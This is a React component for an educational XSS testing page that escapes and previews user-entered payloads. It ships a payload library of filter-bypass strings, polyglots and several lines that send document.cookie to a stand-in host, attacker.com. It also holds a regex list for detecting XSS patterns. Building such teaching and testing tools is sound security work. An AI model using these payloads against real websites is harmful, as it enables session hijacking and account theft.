import { useState } from "react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
import { Textarea } from "@/components/ui/textarea";
import { Button } from "@/components/ui/button";
import { Label } from "@/components/ui/label";
import { Copy, Check, Play, Trash2, AlertTriangle, Shield, Code } from "lucide-react";
import { toast } from "@/hooks/use-toast";
import { Alert, AlertDescription, AlertTitle } from "@/components/ui/alert";
import { Badge } from "@/components/ui/badge";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";

const XSSTester = () => {
    const [payload, setPayload] = useState("");
    const [output, setOutput] = useState("");
    const [testResults, setTestResults] = useState<Array<{ payload: string; triggered: boolean; timestamp: number }>>([]);
    const [copied, setCopied] = useState(false);
    const [context, setContext] = useState("html");

    const commonPayloads = {
        basic: [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            '<svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')">',
            '<body onload=alert("XSS")>',
        ],
        advanced: [
            '<script>fetch("http://attacker.com?cookie="+document.cookie)</script>',
            '<img src=x onerror="eval(atob(\'YWxlcnQoIlhTUyIp\'))">',
            '<svg/onload=alert(String.fromCharCode(88,83,83))>',
            '"><script>alert(String.fromCharCode(88,83,83))</script>',
            "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        ],
        bypass: [
            '<sCript>alert("XSS")</sCriPt>',
            '<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;">',
            '<img src=x onerror="\\u0061\\u006c\\u0065\\u0072\\u0074(\'XSS\')">',
            '<svg><script>alert&lpar;\'XSS\'&rpar;</script></svg>',
            '<iframe src="data:text/html,<script>alert(\'XSS\')</script>">',
        ],
        polyglot: [
            'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//\\x3e',
            '\';alert(String.fromCharCode(88,83,83))//\';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">\'>\\<SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>',
            '">\'><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id)>\'">`><script>alert(1)</script>',
        ],
        dom: [
            '<img src=x onerror="document.body.innerHTML=\'<h1>XSS</h1>\'">',
            '<script>window.location="http://attacker.com?cookie="+document.cookie</script>',
            '<script>document.write("<img src=http://attacker.com/log?cookie=" + document.cookie + ">")</script>',
            '<script>new Image().src="http://attacker.com/steal?cookie="+document.cookie</script>',
        ],
    };

    const handleTest = () => {
        try {
            // Create a sanitized version for display
            const sanitized = payload
                .replace(/</g, "&lt;")
                .replace(/>/g, "&gt;")
                .replace(/"/g, "&quot;")
                .replace(/'/g, "&#39;");

            // Check if payload contains common XSS patterns
            const xssPatterns = [
                /<script/i,
                /javascript:/i,
                /onerror/i,
                /onload/i,
                /onclick/i,
                /onmouseover/i,
                /<iframe/i,
                /<svg/i,
                /<img/i,
                /eval\(/i,
                /alert\(/i,
                /prompt\(/i,
                /confirm\(/i,
            ];

            const triggered = xssPatterns.some(pattern => pattern.test(payload));

            // Add to test results
            setTestResults(prev => [
                { payload, triggered, timestamp: Date.now() },
                ...prev.slice(0, 9), // Keep last 10 results
            ]);

            // Create output based on context
            let contextualOutput = "";
            switch (context) {
                case "html":
                    contextualOutput = `<div>${sanitized}</div>`;
                    break;
                case "attribute":
                    contextualOutput = `<input value="${sanitized}">`;
                    break;
                case "javascript":
                    contextualOutput = `<script>var data = '${sanitized}';</script>`;
                    break;
                case "url":
                    contextualOutput = `<a href="${sanitized}">Link</a>`;
                    break;
                case "css":
                    contextualOutput = `<style>body { background: ${sanitized}; }</style>`;
                    break;
            }

            setOutput(contextualOutput);

            if (triggered) {
                toast({
                    title: "⚠️ XSS Pattern Detected!",
                    description: "This payload contains potential XSS vectors",
                    variant: "destructive",
                });
            } else {
                toast({
                    title: "No XSS Patterns Found",
                    description: "This payload appears safe (basic check only)",
                });
            }
        } catch (error) {
            toast({
                title: "Error",
                description: "Failed to test payload",
                variant: "destructive",
            });
        }
    };

    const handleCopy = () => {
        navigator.clipboard.writeText(payload);
        setCopied(true);
        toast({ description: "Payload copied to clipboard" });
        setTimeout(() => setCopied(false), 2000);
    };

    const handleClear = () => {
        setPayload("");
        setOutput("");
    };

    const loadPayload = (payloadText: string) => {
        setPayload(payloadText);
        toast({ description: "Payload loaded" });
    };

    const clearResults = () => {
        setTestResults([]);
        toast({ description: "Test results cleared" });
    };

    return (
        <div className="container mx-auto py-8 px-4">
            <div className="mb-8">
                <h1 className="text-4xl font-bold mb-2 flex items-center gap-2">
                    <Code className="w-8 h-8" />
                    Interactive XSS Tester
                </h1>
                <p className="text-muted-foreground">
                    Test and analyze XSS payloads in a safe, sandboxed environment
                </p>
            </div>

            <Alert className="mb-6 border-yellow-500/50 bg-yellow-500/10">
                <Shield className="h-4 w-4" />
                <AlertTitle>Testing Environment Only</AlertTitle>
                <AlertDescription>
                    This is a simulated testing environment. Payloads are sanitized and never executed. For educational purposes only.
                </AlertDescription>
            </Alert>

            <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
                {/* Main Tester */}
                <div className="lg:col-span-2 space-y-6">
                    <Card>
                        <CardHeader>
                            <CardTitle>XSS Payload Tester</CardTitle>
                            <CardDescription>
                                Enter your XSS payload to test in different contexts
                            </CardDescription>
                        </CardHeader>
                        <CardContent className="space-y-4">
                            <div>
                                <Label htmlFor="context">Injection Context</Label>
                                <Select value={context} onValueChange={setContext}>
                                    <SelectTrigger>
                                        <SelectValue />
                                    </SelectTrigger>
                                    <SelectContent>
                                        <SelectItem value="html">HTML Context</SelectItem>
                                        <SelectItem value="attribute">HTML Attribute</SelectItem>
                                        <SelectItem value="javascript">JavaScript Context</SelectItem>
                                        <SelectItem value="url">URL Context</SelectItem>
                                        <SelectItem value="css">CSS Context</SelectItem>
                                    </SelectContent>
                                </Select>
                            </div>

                            <div>
                                <Label htmlFor="payload">XSS Payload</Label>
                                <Textarea
                                    id="payload"
                                    placeholder='Enter XSS payload (e.g., <script>alert("XSS")</script>)'
                                    value={payload}
                                    onChange={(e) => setPayload(e.target.value)}
                                    className="min-h-[150px] font-mono text-sm"
                                />
                            </div>

                            <div className="flex gap-2 flex-wrap">
                                <Button onClick={handleTest}>
                                    <Play className="w-4 h-4 mr-2" />
                                    Test Payload
                                </Button>
                                <Button onClick={handleCopy} variant="outline">
                                    {copied ? <Check className="w-4 h-4 mr-2" /> : <Copy className="w-4 h-4 mr-2" />}
                                    Copy
                                </Button>
                                <Button onClick={handleClear} variant="outline">
                                    <Trash2 className="w-4 h-4 mr-2" />
                                    Clear
                                </Button>
                            </div>

                            {output && (
                                <div>
                                    <Label>Sanitized Output (Safe Preview)</Label>
                                    <div className="bg-muted p-4 rounded-lg border">
                                        <pre className="text-xs font-mono overflow-x-auto whitespace-pre-wrap break-words">
                                            {output}
                                        </pre>
                                    </div>
                                </div>
                            )}
                        </CardContent>
                    </Card>

                    {/* Test Results */}
                    <Card>
                        <CardHeader>
                            <div className="flex items-center justify-between">
                                <div>
                                    <CardTitle>Test Results History</CardTitle>
                                    <CardDescription>Recent payload tests and their analysis</CardDescription>
                                </div>
                                {testResults.length > 0 && (
                                    <Button onClick={clearResults} size="sm" variant="outline">
                                        <Trash2 className="w-4 h-4 mr-2" />
                                        Clear
                                    </Button>
                                )}
                            </div>
                        </CardHeader>
                        <CardContent>
                            {testResults.length === 0 ? (
                                <p className="text-muted-foreground text-center py-8">
                                    No test results yet. Test a payload to see results.
                                </p>
                            ) : (
                                <div className="space-y-3">
                                    {testResults.map((result, index) => (
                                        <div
                                            key={index}
                                            className="border rounded-lg p-3 bg-muted/50"
                                        >
                                            <div className="flex items-start justify-between gap-2 mb-2">
                                                <Badge
                                                    variant={result.triggered ? "destructive" : "secondary"}
                                                    className="shrink-0"
                                                >
                                                    {result.triggered ? (
                                                        <>
                                                            <AlertTriangle className="w-3 h-3 mr-1" />
                                                            XSS Detected
                                                        </>
                                                    ) : (
                                                        "Safe"
                                                    )}
                                                </Badge>
                                                <span className="text-xs text-muted-foreground">
                                                    {new Date(result.timestamp).toLocaleTimeString()}
                                                </span>
                                            </div>
                                            <pre className="text-xs font-mono bg-background p-2 rounded overflow-x-auto whitespace-pre-wrap break-words">
                                                {result.payload}
                                            </pre>
                                        </div>
                                    ))}
                                </div>
                            )}
                        </CardContent>
                    </Card>
                </div>

                {/* Payload Library */}
                <div className="space-y-6">
                    <Card>
                        <CardHeader>
                            <CardTitle>Payload Library</CardTitle>
                            <CardDescription>Pre-built XSS payloads for testing</CardDescription>
                        </CardHeader>
                        <CardContent>
                            <Tabs defaultValue="basic">
                                <TabsList className="grid w-full grid-cols-2">
                                    <TabsTrigger value="basic">Basic</TabsTrigger>
                                    <TabsTrigger value="advanced">Advanced</TabsTrigger>
                                </TabsList>

                                <TabsContent value="basic" className="space-y-2 mt-4">
                                    <div className="space-y-2">
                                        <h4 className="font-semibold text-sm mb-2">Basic Payloads</h4>
                                        {commonPayloads.basic.map((p, i) => (
                                            <Button
                                                key={i}
                                                onClick={() => loadPayload(p)}
                                                variant="outline"
                                                className="w-full justify-start text-left h-auto py-2"
                                                size="sm"
                                            >
                                                <pre className="text-xs overflow-hidden text-ellipsis whitespace-nowrap">
                                                    {p.substring(0, 40)}...
                                                </pre>
                                            </Button>
                                        ))}
                                    </div>

                                    <div className="space-y-2 mt-4">
                                        <h4 className="font-semibold text-sm mb-2">Bypass Techniques</h4>
                                        {commonPayloads.bypass.map((p, i) => (
                                            <Button
                                                key={i}
                                                onClick={() => loadPayload(p)}
                                                variant="outline"
                                                className="w-full justify-start text-left h-auto py-2"
                                                size="sm"
                                            >
                                                <pre className="text-xs overflow-hidden text-ellipsis whitespace-nowrap">
                                                    {p.substring(0, 40)}...
                                                </pre>
                                            </Button>
                                        ))}
                                    </div>
                                </TabsContent>

                                <TabsContent value="advanced" className="space-y-2 mt-4">
                                    <div className="space-y-2">
                                        <h4 className="font-semibold text-sm mb-2">Advanced Payloads</h4>
                                        {commonPayloads.advanced.map((p, i) => (
                                            <Button
                                                key={i}
                                                onClick={() => loadPayload(p)}
                                                variant="outline"
                                                className="w-full justify-start text-left h-auto py-2"
                                                size="sm"
                                            >
                                                <pre className="text-xs overflow-hidden text-ellipsis whitespace-nowrap">
                                                    {p.substring(0, 40)}...
                                                </pre>
                                            </Button>
                                        ))}
                                    </div>

                                    <div className="space-y-2 mt-4">
                                        <h4 className="font-semibold text-sm mb-2">DOM-Based XSS</h4>
                                        {commonPayloads.dom.map((p, i) => (
                                            <Button
                                                key={i}
                                                onClick={() => loadPayload(p)}
                                                variant="outline"
                                                className="w-full justify-start text-left h-auto py-2"
                                                size="sm"
                                            >
                                                <pre className="text-xs overflow-hidden text-ellipsis whitespace-nowrap">
                                                    {p.substring(0, 40)}...
                                                </pre>
                                            </Button>
                                        ))}
                                    </div>

                                    <div className="space-y-2 mt-4">
                                        <h4 className="font-semibold text-sm mb-2">Polyglot Payloads</h4>
                                        {commonPayloads.polyglot.slice(0, 2).map((p, i) => (
                                            <Button
                                                key={i}
                                                onClick={() => loadPayload(p)}
                                                variant="outline"
                                                className="w-full justify-start text-left h-auto py-2"
                                                size="sm"
                                            >
                                                <pre className="text-xs overflow-hidden text-ellipsis whitespace-nowrap">
                                                    {p.substring(0, 40)}...
                                                </pre>
                                            </Button>
                                        ))}
                                    </div>
                                </TabsContent>
                            </Tabs>
                        </CardContent>
                    </Card>

                    <Card className="bg-blue-500/10 border-blue-500/50">
                        <CardHeader>
                            <CardTitle className="text-sm">Testing Tips</CardTitle>
                        </CardHeader>
                        <CardContent className="text-sm space-y-2">
                            <p>• Test in different contexts (HTML, attribute, JS)</p>
                            <p>• Try encoding/obfuscation techniques</p>
                            <p>• Test with and without quotes</p>
                            <p>• Use case variations to bypass filters</p>
                            <p>• Combine multiple techniques (polyglot)</p>
                        </CardContent>
                    </Card>
                </div>
            </div>
        </div>
    );
};

export default XSSTester;
